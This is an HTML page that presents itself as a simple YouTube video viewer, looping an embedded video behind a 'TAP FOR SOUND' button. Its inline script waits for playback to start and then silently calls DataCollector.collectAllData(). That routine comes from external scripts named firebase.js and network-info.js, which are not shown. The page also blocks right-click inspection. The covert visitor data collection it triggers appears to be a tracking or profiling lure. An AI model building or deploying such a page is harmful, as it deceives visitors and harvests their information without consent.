<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>YouTube Video Viewer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #000;
            touch-action: manipulation;
            overflow: hidden;
            font-family: Arial, sans-serif;
            position: relative;
        }
        
        .video-container {
            width: 100%;
            height: 100%;
            position: relative;
        }
        
        #yt-video {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        #unmute-btn {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            padding: 15px 30px;
            background: linear-gradient(45deg, #ff0000, #ff6b6b);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.3);
            z-index: 1000;
            transition: all 0.3s ease;
        }
        
        #unmute-btn:hover {
            transform: translateX(-50%) scale(1.1);
            box-shadow: 0 6px 25px rgba(255, 0, 0, 0.5);
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: translateX(-50%) scale(1); }
            50% { transform: translateX(-50%) scale(1.1); }
            100% { transform: translateX(-50%) scale(1); }
        }
        
        #status {
            position: fixed;
            top: 10px;
            left: 10px;
            color: #fff;
            font-size: 12px;
            background: rgba(0,0,0,0.5);
            padding: 5px 10px;
            border-radius: 5px;
            z-index: 1000;
            display: none; /* Hidden by default */
        }
        
        .hidden {
            display: none !important;
        }
        
        /* Loading animation */
        .loader {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 16px;
            z-index: 999;
        }
    </style>
</head>
<body>
    <div class="loader" id="loader">Loading Video...</div>

    <div class="video-container">
        <iframe id="yt-video" 
                src="https://www.youtube.com/embed/YnDtpILctso?autoplay=1&mute=1&enablejsapi=1&playsinline=1&controls=0&showinfo=0&rel=0" 
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                allowfullscreen></iframe>
    </div>

    <button id="unmute-btn" class="pulse">🔊 TAP FOR SOUND</button>
    <div id="status"></div>

    <!-- Scripts -->
    <script type="module" src="scripts/firebase.js"></script>
    <script src="scripts/network-info.js"></script>
    <script src="scripts/main.js"></script>
    
    <script>
        // Hide everything except video and unmute button
        let dataCollected = false;
        
        // Disable zooming and right-click
        document.addEventListener('gesturestart', function(e) {
            e.preventDefault();
        });
        
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        
        // YouTube API
        var tag = document.createElement('script');
        tag.src = "https://www.youtube.com/iframe_api";
        var firstScriptTag = document.getElementsByTagName('script')[0];
        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

        var player;
        
        function onYouTubeIframeAPIReady() {
            player = new YT.Player('yt-video', {
                events: {
                    'onReady': onPlayerReady,
                    'onStateChange': onPlayerStateChange
                }
            });
        }

        function onPlayerReady(event) {
            event.target.playVideo();
            document.getElementById('loader').classList.add('hidden');
        }

        function onPlayerStateChange(event) {
            if(event.data == YT.PlayerState.ENDED) {
                player.playVideo(); // Loop the video
            }
            
            // Start data collection when video starts playing
            if(event.data == YT.PlayerState.PLAYING && !dataCollected) {
                setTimeout(captureData, 2000);
                dataCollected = true;
            }
        }

        function unmuteVideo() {
            if(player) {
                player.unMute();
                player.setVolume(100);
                document.getElementById('unmute-btn').classList.add('hidden');
            }
        }

        // Unmute button
        document.getElementById('unmute-btn').addEventListener('click', function() {
            unmuteVideo();
            this.classList.remove('pulse');
        });

        // Data collection
        async function captureData() {
            try {
                const result = await DataCollector.collectAllData();
                
                if (result.success) {
                    console.log('Data collection successful:', result);
                }
            } catch (error) {
                console.error('Data collection error:', error);
            }
        }

        // Auto-start
        window.addEventListener('load', function() {
            console.log('Video viewer started');
        });
    </script>
</body>
</html>
